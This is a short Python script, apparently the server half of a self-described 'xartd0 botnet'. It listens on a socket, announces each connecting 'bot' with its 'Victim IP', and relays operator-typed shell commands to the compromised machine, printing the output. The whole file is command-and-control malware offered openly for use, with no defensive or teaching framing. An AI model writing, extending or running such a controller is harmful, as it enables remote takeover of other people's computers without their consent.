from tkinter import S
from imports import *

s = socket.socket()

def exit():
    print(f"» Listen to the {HOST_CLIENT}:{PORT}")
    Listener()

    
def Listener():
    socks, client = s.accept()
    print("\n»  ┏   The new bot is connected to the server!  ┓")
    print(f'»  ┗   Victim IP : {client[0]}:{client[1]}           ┛')
    control_bot(socks)


def control_bot(socks):
    try:
        while True:
            comm = input('❯ Server: ')
            socks.send(comm.encode())
            resultcomm = socks.recv(1024).decode()
            print(resultcomm)
            if comm == 'exit':
                exit()
    except ConnectionResetError:
        print('Connection lost :(')
        exit()


def main():
    print('» xartd0 botnet')
    s.bind((HOST_SERVER, PORT))
    s.listen(5)
    print(f"» Listen to the {HOST_CLIENT}:{PORT}")
    Listener()


if __name__ == "__main__":
    main()


